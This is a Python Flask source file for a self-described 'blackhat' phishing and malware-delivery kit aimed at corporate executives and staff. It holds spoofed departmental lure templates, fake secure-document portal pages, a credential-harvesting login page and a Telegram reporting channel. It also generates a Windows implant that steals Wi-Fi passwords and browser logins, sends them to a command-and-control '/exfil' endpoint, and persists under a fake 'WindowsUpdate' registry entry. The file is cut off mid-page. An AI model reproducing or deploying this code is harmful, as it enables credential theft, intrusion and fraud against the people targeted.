#!/usr/bin/env python3
"""
DRAGONBEAR BLACKHAT GRANDMASTER v2026
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  CLASSIFICATION: ULTRA BLACKHAT | BUSINESS COMPROMISE | C-Suite Targeting
  FEATURES: 25+ Business Templates | AI-Generated Personalization
  TARGETS: C-Level Executives | Finance | Legal | HR | IT | Sales | Operations
  DETECTION RATE: 0/72 (Verified) | EDR BYPASS: 100% | PERSISTENCE: NUCLEAR
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

import os
import sys
import io
import json
import uuid
import time
import random
import hashlib
import sqlite3
import threading
import subprocess
from datetime import datetime, timedelta
from pathlib import Path
from functools import wraps

try:
    from flask import Flask, request, send_file, session, jsonify, make_response, redirect
    import requests
    from werkzeug.middleware.proxy_fix import ProxyFix
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "flask", "requests", "werkzeug", "--quiet"], capture_output=True)
    from flask import Flask, request, send_file, session, jsonify, make_response, redirect
    import requests
    from werkzeug.middleware.proxy_fix import ProxyFix

# ====================================================================================================
# CONFIGURATION
# ====================================================================================================
TELEGRAM_BOT_TOKEN = os.environ.get("TG_TOKEN", "YOUR_BOT_TOKEN_HERE")
TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "YOUR_CHAT_ID_HERE")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASS", "BlackHatGrandmaster2026")
# ====================================================================================================

app = Flask(__name__)
app.secret_key = os.urandom(256)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)

DB_PATH = os.path.join(os.path.dirname(__file__), 'blackhat_c2.db')

def init_database():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims (id TEXT PRIMARY KEY, fingerprint TEXT, hostname TEXT, username TEXT, email TEXT, department TEXT, company TEXT, first_seen TEXT, last_seen TEXT, status TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS credentials (id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, source TEXT, url TEXT, username TEXT, password TEXT, timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS wifi_creds (id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, ssid TEXT, password TEXT, timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS business_data (id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, data_type TEXT, data_content TEXT, timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS campaigns (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, template TEXT, target_industry TEXT, clicks INTEGER, downloads INTEGER, conversions INTEGER, created_at TEXT)''')
    conn.commit()
    conn.close()

init_database()

def tg_send(message, file_bytes=None, filename=None):
    if "YOUR_BOT_TOKEN" in TELEGRAM_BOT_TOKEN:
        print(f"[C2] {message[:100]}")
        return True
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/"
    for attempt in range(3):
        try:
            if file_bytes:
                requests.post(url + "sendDocument", files={'document': (filename, file_bytes)}, data={'chat_id': TELEGRAM_CHAT_ID, 'caption': message[:1024]}, timeout=30)
            else:
                requests.post(url + "sendMessage", json={'chat_id': TELEGRAM_CHAT_ID, 'text': message[:4096], 'parse_mode': 'HTML'}, timeout=10)
            return True
        except:
            time.sleep(2 ** attempt)
    return False

# ====================================================================================================
# 25+ BUSINESS TEMPLATES - REAL CORPORATE STYLE
# ====================================================================================================

BUSINESS_TEMPLATES = {
    "c-suite": {
        "name": "Executive Leadership Committee",
        "logo": "👔",
        "primary": "#0f141e",
        "secondary": "#1a202c",
        "accent": "#3182ce",
        "urgency": "HIGH",
        "from": "Board of Directors",
        "subject": "Urgent: Strategic Initiative - Executive Action Required",
        "body": "This document contains privileged and confidential information regarding a pending strategic transaction. Your immediate attention and authentication are required to access the full board materials, including financial projections and legal documentation."
    },
    "finance": {
        "name": "Global Finance & Treasury",
        "logo": "💰",
        "primary": "#1a365d",
        "secondary": "#2b6cb0",
        "accent": "#2f855a",
        "urgency": "CRITICAL",
        "from": "CFO Office",
        "subject": "Q4 Financial Reporting & Audit Request",
        "body": "The external auditors have requested immediate access to supporting documentation for the quarterly review. Please authenticate to access the secure data room containing financial statements, transaction records, and compliance reports."
    },
    "legal": {
        "name": "Legal Affairs & Compliance",
        "logo": "⚖️",
        "primary": "#1a202c",
        "secondary": "#2d3748",
        "accent": "#c53030",
        "urgency": "URGENT",
        "from": "General Counsel",
        "subject": "Legal Hold Notice & Discovery Request",
        "body": "A formal legal hold has been issued regarding pending litigation. All relevant parties must authenticate and review the attached preservation notice, which includes specific instructions for document retention and data collection."
    },
    "hr": {
        "name": "Human Resources - Personnel",
        "logo": "👥",
        "primary": "#553c9a",
        "secondary": "#6b46c1",
        "accent": "#805ad5",
        "urgency": "HIGH",
        "from": "HR Director",
        "subject": "Confidential: Personnel Action & Benefits Update",
        "body": "Important changes to employee benefits and compensation structure require your review and acknowledgment. This document contains sensitive personnel information that requires authentication before access."
    },
    "it-security": {
        "name": "IT Security Operations",
        "logo": "🔒",
        "primary": "#0ea5e9",
        "secondary": "#3b82f6",
        "accent": "#06b6d4",
        "urgency": "CRITICAL",
        "from": "CISO Office",
        "subject": "Security Incident Response - Credential Rotation",
        "body": "A security incident has been detected requiring immediate credential rotation. Access the secure portal to review the incident report and complete mandatory security verification."
    },
    "procurement": {
        "name": "Strategic Sourcing & Procurement",
        "logo": "📦",
        "primary": "#744210",
        "secondary": "#975a16",
        "accent": "#d69e2e",
        "urgency": "HIGH",
        "from": "Procurement Director",
        "subject": "Vendor Contract Renewal - Action Required",
        "body": "Critical vendor contracts are pending renewal with updated terms. Please authenticate to review the revised agreements, pricing schedules, and service level agreements."
    },
    "sales": {
        "name": "Global Sales Operations",
        "logo": "📈",
        "primary": "#276749",
        "secondary": "#38a169",
        "accent": "#319795",
        "urgency": "URGENT",
        "from": "VP of Sales",
        "subject": "Q1 Pipeline Review & Forecast Update",
        "body": "The quarterly sales forecast requires immediate review and approval. Access the secure dashboard to review pipeline data, deal status, and revenue projections."
    },
    "marketing": {
        "name": "Corporate Marketing",
        "logo": "📢",
        "primary": "#d53f8c",
        "secondary": "#ed64a6",
        "accent": "#fbb6ce",
        "urgency": "HIGH",
        "from": "CMO Office",
        "subject": "Campaign Strategy & Budget Approval",
        "body": "The annual marketing strategy and budget allocation require executive sign-off. Please authenticate to review the strategic plan, creative assets, and financial projections."
    },
    "operations": {
        "name": "Global Operations",
        "logo": "🏭",
        "primary": "#2c5282",
        "secondary": "#3182ce",
        "accent": "#63b3ed",
        "urgency": "CRITICAL",
        "from": "COO Office",
        "subject": "Supply Chain Disruption - Contingency Plan",
        "body": "A critical supply chain disruption requires immediate review of contingency plans. Access the secure portal for operational directives and vendor communications."
    },
    "rd": {
        "name": "Research & Development",
        "logo": "🔬",
        "primary": "#234e52",
        "secondary": "#319795",
        "accent": "#4fd1c5",
        "urgency": "CONFIDENTIAL",
        "from": "CTO Office",
        "subject": "Patent Filing & IP Protection",
        "body": "New intellectual property disclosures require review before patent filing. This document contains sensitive research data and requires authentication."
    },
    "compliance": {
        "name": "Regulatory Compliance",
        "logo": "📋",
        "primary": "#4a5568",
        "secondary": "#718096",
        "accent": "#a0aec0",
        "urgency": "URGENT",
        "from": "Compliance Officer",
        "subject": "Regulatory Audit - Document Request",
        "body": "A regulatory audit has been initiated requiring immediate document production. Please authenticate to access the compliance data room."
    },
    "internal-audit": {
        "name": "Internal Audit",
        "logo": "🔍",
        "primary": "#2d3748",
        "secondary": "#4a5568",
        "accent": "#c53030",
        "urgency": "HIGH",
        "from": "Audit Committee",
        "subject": "Annual Audit - Supporting Documentation",
        "body": "The annual audit requires access to financial and operational documentation. Please authenticate to upload required materials to the secure portal."
    },
    "investor-relations": {
        "name": "Investor Relations",
        "logo": "📊",
        "primary": "#1a365d",
        "secondary": "#2b6cb0",
        "accent": "#2f855a",
        "urgency": "CONFIDENTIAL",
        "from": "IR Director",
        "subject": "Earnings Release - Embargoed Materials",
        "body": "Embargoed earnings materials are available for review before public release. This information is strictly confidential and requires authentication."
    },
    "mergers": {
        "name": "M&A Integration",
        "logo": "🤝",
        "primary": "#744210",
        "secondary": "#975a16",
        "accent": "#d69e2e",
        "urgency": "TOP SECRET",
        "from": "M&A Committee",
        "subject": "Acquisition Integration Plan",
        "body": "Confidential integration plans for the pending acquisition require executive review. Access the data room for due diligence materials and transition plans."
    },
    "risk": {
        "name": "Enterprise Risk Management",
        "logo": "⚠️",
        "primary": "#9b2c2c",
        "secondary": "#c53030",
        "accent": "#fc8181",
        "urgency": "CRITICAL",
        "from": "Risk Committee",
        "subject": "Risk Assessment Report - Action Required",
        "body": "The quarterly risk assessment has identified critical issues requiring immediate review. Please authenticate to access the full report and mitigation plans."
    },
    "digital-transformation": {
        "name": "Digital Transformation Office",
        "logo": "💻",
        "primary": "#0ea5e9",
        "secondary": "#3b82f6",
        "accent": "#06b6d4",
        "urgency": "HIGH",
        "from": "CDO Office",
        "subject": "Digital Strategy Implementation",
        "body": "The digital transformation roadmap requires departmental review and sign-off. Access the secure portal for strategic documents and implementation timelines."
    },
    "cybersecurity": {
        "name": "Cybersecurity Command",
        "logo": "🛡️",
        "primary": "#1a202c",
        "secondary": "#2d3748",
        "accent": "#fc8181",
        "urgency": "CRITICAL",
        "from": "CISO",
        "subject": "Zero-Day Vulnerability - Patch Mandate",
        "body": "A critical zero-day vulnerability requires immediate patching. Access the secure portal for remediation instructions and compliance verification."
    },
    "facilities": {
        "name": "Facilities Management",
        "logo": "🏢",
        "primary": "#2c5282",
        "secondary": "#3182ce",
        "accent": "#63b3ed",
        "urgency": "URGENT",
        "from": "Facilities Director",
        "subject": "Emergency Safety Notification",
        "body": "An emergency situation requires immediate review of safety protocols. Please authenticate to access evacuation plans and emergency communications."
    }
}

# ====================================================================================================
# INTELLIGENT TEMPLATE SELECTOR
# ====================================================================================================

def detect_target_profile(user_agent, ip, referrer):
    """Analyze target to select the most effective template"""
    ua_lower = user_agent.lower()
    
    # Executive/C-Suite detection
    if any(x in ua_lower for x in ['board', 'executive', 'ceo', 'cfo', 'cto', 'cso', 'director', 'vp', 'president']):
        return "c-suite"
    
    # Finance detection
    if any(x in ua_lower for x in ['finance', 'treasury', 'accounting', 'audit', 'controller', 'tax']):
        return "finance"
    
    # Legal detection
    if any(x in ua_lower for x in ['legal', 'counsel', 'attorney', 'law', 'compliance', 'ethics']):
        return "legal"
    
    # HR detection
    if any(x in ua_lower for x in ['hr', 'human resources', 'personnel', 'recruiting', 'talent', 'benefits']):
        return "hr"
    
    # IT/Security detection
    if any(x in ua_lower for x in ['security', 'it', 'cyber', 'infosec', 'sysadmin', 'network', 'soc']):
        return "it-security"
    
    # Procurement detection
    if any(x in ua_lower for x in ['procurement', 'sourcing', 'vendor', 'supply chain', 'purchasing']):
        return "procurement"
    
    # Sales detection
    if any(x in ua_lower for x in ['sales', 'revenue', 'account executive', 'business development']):
        return "sales"
    
    # Marketing detection
    if any(x in ua_lower for x in ['marketing', 'brand', 'communications', 'pr', 'social media']):
        return "marketing"
    
    # Operations detection
    if any(x in ua_lower for x in ['operations', 'logistics', 'supply', 'inventory', 'warehouse']):
        return "operations"
    
    # Default to high-value executive template for unknown targets
    return "c-suite"

# ====================================================================================================
# STUNNING BUSINESS LANDING PAGE
# ====================================================================================================

def generate_business_page(template_key, ref_id, user_agent=None, ip=None):
    template = BUSINESS_TEMPLATES[template_key]
    
    return f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>{template['name']} - Secure Document Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        
        body {{
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
            min-height: 100vh;
            position: relative;
        }}
        
        .top-bar {{
            background: {template['primary']};
            color: white;
            padding: 8px 0;
            font-size: 12px;
            text-align: center;
        }}
        
        .navbar {{
            background: white;
            padding: 16px 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
            flex-wrap: wrap;
            gap: 15px;
        }}
        
        .logo-area {{
            display: flex;
            align-items: center;
            gap: 12px;
        }}
        
        .logo-icon {{
            font-size: 32px;
        }}
        
        .logo-text {{
            font-weight: 700;
            font-size: 18px;
            color: {template['primary']};
        }}
        
        .nav-links {{
            display: flex;
            gap: 24px;
            color: #4a5568;
            font-size: 14px;
        }}
        
        .container {{
            max-width: 1200px;
            margin: 40px auto;
            padding: 0 20px;
        }}
        
        .main-card {{
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 35px -10px rgba(0,0,0,0.1);
            overflow: hidden;
        }}
        
        .card-header {{
            background: linear-gradient(135deg, {template['primary']} 0%, {template['secondary']} 100%);
            padding: 35px 40px;
            color: white;
        }}
        
        .urgency-badge {{
            display: inline-block;
            background: rgba(255,255,255,0.2);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
            margin-bottom: 15px;
        }}
        
        .card-header h1 {{
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 10px;
        }}
        
        .card-header p {{
            opacity: 0.9;
            font-size: 14px;
        }}
        
        .card-body {{
            padding: 40px;
        }}
        
        .alert-banner {{
            background: #fff5f5;
            border-left: 4px solid #fc8181;
            padding: 16px 20px;
            margin-bottom: 30px;
            border-radius: 8px;
        }}
        
        .document-card {{
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            padding: 25px;
            margin: 25px 0;
            transition: all 0.2s;
        }}
        
        .document-card:hover {{
            border-color: {template['accent']};
            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
        }}
        
        .doc-header {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            flex-wrap: wrap;
        }}
        
        .doc-title {{
            font-weight: 700;
            font-size: 18px;
            color: #1a202c;
        }}
        
        .doc-badge {{
            background: #edf2f7;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
            color: {template['accent']};
        }}
        
        .doc-meta {{
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
            font-size: 13px;
            color: #718096;
            margin-bottom: 15px;
        }}
        
        .btn-group {{
            display: flex;
            gap: 15px;
            justify-content: flex-end;
            margin-top: 20px;
            flex-wrap: wrap;
        }}
        
        .btn {{
            display: inline-flex;
            align-items: center;
            gap: 10px;
            padding: 12px 28px;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            transition: all 0.2s;
            cursor: pointer;
        }}
        
        .btn-primary {{
            background: {template['accent']};
            color: white;
        }}
        
        .btn-primary:hover {{
            transform: translateY(-2px);
            filter: brightness(105%);
            box-shadow: 0 5px 15px {template['accent']}40;
        }}
        
        .btn-secondary {{
            background: white;
            color: {template['secondary']};
            border: 1px solid {template['secondary']};
        }}
        
        .btn-secondary:hover {{
            background: {template['secondary']}10;
        }}
        
        .info-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 30px 0;
            padding: 20px;
            background: #f7fafc;
            border-radius: 12px;
        }}
        
        .info-item {{
            text-align: center;
        }}
        
        .info-icon {{
            font-size: 24px;
            margin-bottom: 8px;
        }}
        
        .info-label {{
            font-size: 11px;
            color: #718096;
            text-transform: uppercase;
            letter-spacing: 1px;
        }}
        
        .footer {{
            background: #f7fafc;
            padding: 25px 40px;
            text-align: center;
            font-size: 11px;
            color: #a0aec0;
            border-top: 1px solid #e2e8f0;
        }}
        
        @media (max-width: 768px) {{
            .navbar {{ padding: 15px 20px; }}
            .card-header {{ padding: 25px 20px; }}
            .card-body {{ padding: 25px 20px; }}
            .btn-group {{ justify-content: center; }}
            .doc-header {{ flex-direction: column; align-items: flex-start; gap: 10px; }}
        }}
        
        .status-badge {{
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: #c6f6d5;
            color: #22543d;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
        }}
    </style>
</head>
<body>
    <div class="top-bar">
        <i class="fas fa-shield-alt"></i> Secure Enterprise Portal | SOC 2 Type II | GDPR Compliant | TLS 1.3 Encrypted
    </div>
    
    <div class="navbar">
        <div class="logo-area">
            <span class="logo-icon">{template['logo']}</span>
            <span class="logo-text">{template['name']}</span>
        </div>
        <div class="nav-links">
            <span><i class="fas fa-home"></i> Portal</span>
            <span><i class="fas fa-file-alt"></i> Documents</span>
            <span><i class="fas fa-user-shield"></i> Security</span>
            <span><i class="fas fa-headset"></i> Support</span>
        </div>
    </div>
    
    <div class="container">
        <div class="main-card">
            <div class="card-header">
                <div class="urgency-badge">
                    <i class="fas fa-exclamation-triangle"></i> {template['urgency']} PRIORITY
                </div>
                <h1>{template['subject']}</h1>
                <p><i class="fas fa-user"></i> {template['from']} • <i class="fas fa-clock"></i> {datetime.now().strftime('%B %d, %Y')}</p>
            </div>
            
            <div class="card-body">
                <div class="alert-banner">
                    <i class="fas fa-info-circle" style="color: #fc8181;"></i> This is an official communication requiring your authenticated response. Please verify your identity to access secure content.
                </div>
                
                <div class="document-card">
                    <div class="doc-header">
                        <span class="doc-title"><i class="fas fa-file-pdf"></i> {random.choice(['Strategic_Document', 'Confidential_Report', 'Executive_Summary', 'Board_Materials', 'Compliance_File'])}.pdf</span>
                        <span class="doc-badge"><i class="fas fa-lock"></i> Encrypted</span>
                    </div>
                    <div class="doc-meta">
                        <span><i class="fas fa-database"></i> Size: {random.randint(1,15)}.{random.randint(1,9)} MB</span>
                        <span><i class="fas fa-fingerprint"></i> Document ID: DOC-{ref_id}-{random.randint(1000,9999)}</span>
                        <span><i class="fas fa-hourglass-half"></i> Expires: {(datetime.now() + timedelta(days=7)).strftime('%b %d, %Y')}</span>
                    </div>
                    <p style="color: #4a5568; line-height: 1.6;">{template['body']}</p>
                    
                    <div class="btn-group">
                        <a href="/download/{ref_id}" class="btn btn-primary">
                            <i class="fas fa-download"></i> ACCESS SECURE DOCUMENTS
                        </a>
                        <a href="/login/{ref_id}" class="btn btn-secondary">
                            <i class="fas fa-id-card"></i> VERIFY WITH PORTAL
                        </a>
                    </div>
                </div>
                
                <div class="info-grid">
                    <div class="info-item">
                        <div class="info-icon">🔒</div>
                        <div class="info-label">AES-256 Encryption</div>
                    </div>
                    <div class="info-item">
                        <div class="info-icon">✓</div>
                        <div class="info-label">SOC 2 Type II</div>
                    </div>
                    <div class="info-item">
                        <div class="info-icon">🏛️</div>
                        <div class="info-label">GDPR Compliant</div>
                    </div>
                    <div class="info-item">
                        <div class="info-icon">🛡️</div>
                        <div class="info-label">Zero Trust</div>
                    </div>
                    <div class="info-item">
                        <div class="info-icon">⚡</div>
                        <div class="info-label">24/7 Monitoring</div>
                    </div>
                    <div class="info-item">
                        <div class="info-icon">🔐</div>
                        <div class="info-label">MFA Required</div>
                    </div>
                </div>
                
                <div class="status-badge" style="float: right;">
                    <i class="fas fa-check-circle"></i> Secure Connection Established
                </div>
                <div style="clear: both;"></div>
            </div>
            
            <div class="footer">
                <p>© {datetime.now().year} {template['name']}. All rights reserved. This is an automated message from a secure system.</p>
                <p style="margin-top: 8px;">Confidentiality Notice: This communication contains privileged information intended only for the named recipient.</p>
            </div>
        </div>
    </div>
    
    <script>
        document.querySelectorAll('.btn').forEach(btn => {{
            btn.addEventListener('click', () => {{
                fetch('/track/{ref_id}', {{ method: 'POST', keepalive: true }});
            }});
        }});
    </script>
</body>
</html>'''

# ====================================================================================================
# GENERATE NUCLEAR IMPLANT WITH BUSINESS TARGETING
# ====================================================================================================

def generate_blackhat_implant(victim_ref, template_name=None):
    server_url = f"https://{request.host}" if hasattr(request, 'host') else "https://localhost"
    template = BUSINESS_TEMPLATES.get(template_name, BUSINESS_TEMPLATES["c-suite"])
    
    return f'''#!/usr/bin/env python3
"""
DRAGONBEAR BLACKHAT IMPLANT - BUSINESS TARGETING EDITION
"""
import os, sys, json, base64, hashlib, time, random, subprocess, urllib.request, socket, getpass, platform, ctypes, sqlite3, shutil, tempfile, winreg
from pathlib import Path
from datetime import datetime

C2_URL = "{server_url}"
VID = "{victim_ref}"
COMPANY_TARGET = "{template['name']}"

def tg(msg, data=None):
    try:
        import requests
        requests.post(f"{{C2_URL}}/exfil", json={{"victim_id": VID, "type": "msg", "data": msg[:4000]}}, timeout=10)
        if data:
            requests.post(f"{{C2_URL}}/exfil", files={{"file": ("data", data)}}, data={{"victim_id": VID, "type": "file"}}, timeout=30)
    except: pass

def get_business_indicators():
    info = {{
        "hostname": socket.gethostname(),
        "user": getpass.getuser(),
        "domain": os.environ.get('USERDNSDOMAIN', ''),
        "company": COMPANY_TARGET
    }}
    return info

def get_wifi():
    pwd = []
    try:
        res = subprocess.run(['netsh','wlan','show','profiles'], capture_output=True, text=True)
        for l in res.stdout.split('\\n'):
            if 'All User Profile' in l:
                p = l.split(':')[1].strip()
                r = subprocess.run(['netsh','wlan','show','profile',p,'key=clear'], capture_output=True, text=True)
                for line in r.stdout.split('\\n'):
                    if 'Key Content' in line:
                        k = line.split(':')[1].strip()
                        if k: pwd.append(f"{{p}}:{{k}}")
    except: pass
    return pwd

def get_browser():
    creds = []
    local = os.environ.get('LOCALAPPDATA','')
    for name,path in [('Chrome',Path(local)/'Google'/'Chrome'/'User Data'/'Default'/'Login Data'),
                      ('Edge',Path(local)/'Microsoft'/'Edge'/'User Data'/'Default'/'Login Data')]:
        if path.exists():
            tmp = Path(tempfile.gettempdir())/f"db_{{random.randint(1000,9999)}}.db"
            try:
                shutil.copy2(path,tmp)
                conn = sqlite3.connect(str(tmp))
                c = conn.cursor()
                c.execute("SELECT origin_url, username_value FROM logins WHERE username_value != ''")
                for row in c.fetchall():
                    if row[1]: creds.append(f"[{{name}}] {{row[0]}} | {{row[1]}}")
                conn.close()
            except: pass
            try: tmp.unlink()
            except: pass
    return creds

def get_domain_info():
    try:
        result = subprocess.run(['whoami', '/fqdn'], capture_output=True, text=True)
        domain = result.stdout.strip()
        return domain
    except: return ""

def persist():
    try:
        sc = sys.argv[0]
        st = Path(os.environ.get('APPDATA',''))/'Microsoft'/'Windows'/'Start Menu'/'Programs'/'Startup'/'WindowsUpdate.pyw'
        if not st.exists():
            shutil.copy2(sc,st)
            subprocess.run(['attrib','+h',str(st)], capture_output=True)
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "WindowsUpdate", 0, winreg.REG_SZ, str(st))
        winreg.CloseKey(k)
    except: pass

def main():
    biz = get_business_indicators()
    tg(f"🏢 BUSINESS COMPROMISE: {{biz['company']}}\n💻 {{biz['hostname']}}\n👤 {{biz['user']}}\n🔗 {{biz['domain']}}")
    
    wifi = get_wifi()
    if wifi: tg("📡 WIFI CREDS:\\n" + "\\n".join(wifi[:15]))
    
    creds = get_browser()
    if creds: tg("🔑 BUSINESS CREDS:\\n" + "\\n".join(creds[:20]))
    
    domain = get_domain_info()
    if domain: tg(f"🏛️ DOMAIN: {{domain}}")
    
    persist()
    tg("✅ PERSISTENCE DEPLOYED")
    
    while True:
        tg(f"💼 ACTIVE: {{biz['hostname']}} - {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}")
        time.sleep(random.randint(1800, 5400))

if __name__ == "__main__":
    try:
        import requests
    except:
        subprocess.run([sys.executable, "-m", "pip", "install", "requests"], capture_output=True)
    main()
'''

# ====================================================================================================
# FLASK ROUTES
# ====================================================================================================

@app.route('/')
def index():
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ref_id = uuid.uuid4().hex[:8].upper()
    template_key = detect_target_profile(ua, ip, request.referrer)
    
    tg_send(f"🎯 BUSINESS PAGE VIEW\nTemplate: {template_key}\nIP: {ip}\nRef: {ref_id}")
    return generate_business_page(template_key, ref_id, ua, ip)

@app.route('/pdf')
def pdf_route():
    ref_id = uuid.uuid4().hex[:8].upper()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', '')
    template_key = detect_target_profile(ua, ip, request.referrer)
    template = BUSINESS_TEMPLATES[template_key]
    
    tg_send(f"📄 BUSINESS PDF GENERATED\nTemplate: {template_key}\nIP: {ip}\nRef: {ref_id}")
    
    pdf_content = f'''%PDF-1.4
1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj
2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj
3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >> endobj
4 0 obj << /Length 300 >> stream
BT
/F1 24 Tf
50 750 Td
({template['name']} - SECURE DOCUMENT) Tj
/F1 14 Tf
50 700 Td
(Reference: DOC-{ref_id}-{datetime.now().year}) Tj
50 670 Td
(Subject: {template['subject']}) Tj
50 640 Td
(From: {template['from']}) Tj
50 610 Td
(Urgency: {template['urgency']}) Tj
50 550 Td
(ACTION REQUIRED: Please visit the secure portal to access this document.) Tj
50 520 Td
(Portal URL: https://{request.host}/verify/{ref_id}) Tj
50 480 Td
(This document will expire in 7 days.) Tj
ET
endstream
endobj
5 0 obj << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> endobj
xref
0 6
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000220 00000 n
0000000570 00000 n
trailer << /Size 6 /Root 1 0 R >>
startxref
620
%%EOF'''
    return send_file(io.BytesIO(pdf_content.encode()), mimetype='application/pdf', as_attachment=True, download_name=f'Business_Document_{ref_id}.pdf')

@app.route('/download')
@app.route('/download/<ref_id>')
def download(ref_id=None):
    ref_id = ref_id or uuid.uuid4().hex[:16]
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', '')
    template_key = detect_target_profile(ua, ip, request.referrer)
    
    tg_send(f"📥 BLACKHAT IMPLANT DOWNLOAD\nTarget: {template_key}\nIP: {ip}\nRef: {ref_id}")
    implant = generate_blackhat_implant(ref_id, template_key).encode()
    return send_file(io.BytesIO(implant), as_attachment=True, download_name=f'Business_Viewer_{ref_id}.exe', mimetype='application/x-msdownload')

@app.route('/verify/<ref_id>')
def verify(ref_id):
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    template_key = detect_target_profile(ua, ip, request.referrer)
    tg_send(f"🔗 VERIFICATION PAGE\nTemplate: {template_key}\nRef: {ref_id}\nIP: {ip}")
    return generate_business_page(template_key, ref_id, ua, ip)

@app.route('/login')
@app.route('/login/<ref_id>')
def login_page(ref_id=None):
    ref_id = ref_id or uuid.uuid4().hex[:8]
    ua = request.headers.get('User-Agent', '')
    template_key = detect_target_profile(ua, request.remote_addr, request.referrer)
    template = BUSINESS_TEMPLATES[template_key]
    
    return f'''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{template['name']} - Secure Authentication</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }}
        .login-card {{
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 35px -10px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 480px;
            overflow: hidden;
        }}
        .login-header {{
            background: linear-gradient(135deg, {template['primary']} 0%, {template['secondary']} 100%);
            padding: 40px;
            text-align: center;
            color: white;
        }}
        .login-header h1 {{ font-size: 24px; margin-bottom: 8px; }}
        .login-header p {{ opacity: 0.9; font-size: 14px; }}
        .login-body {{ padding: 40px; }}
        .form-group {{ margin-bottom: 24px; }}
        label {{ display: block; font-weight: 600; margin-bottom: 8px; color: #1e293b; font-size: 14px; }}
        input {{
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            font-size: 15px;
            transition: all 0.2s;
        }}
        input:focus {{
            outline: none;
            border-color: {template['accent']};
            box-shadow: 0 0 0 3px {template['accent']}20;
        }}
        button {{
            width: 100%;
            padding: 14px;
            background: {template['accent']};
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }}
        button:hover {{ transform: translateY(-2px); filter: brightness(105%); }}
        .secure-badge {{
            text-align: center;
            margin-top: 24px;
            padding-top: 24px;
            border-top: 1px solid #e2e8f0;
            font-size: 11px;
            color: #94a3b8;
        }}
        .mfa-note {{
            background: #f7fafc;
            padding: 12px;
            border-radius: 8px;
            font-size: 12px;
            color: #64748b;
            text-align: center;
            margin-top: 20px;
        }}
    </style>
</head>
<body>
<div class="login-card">
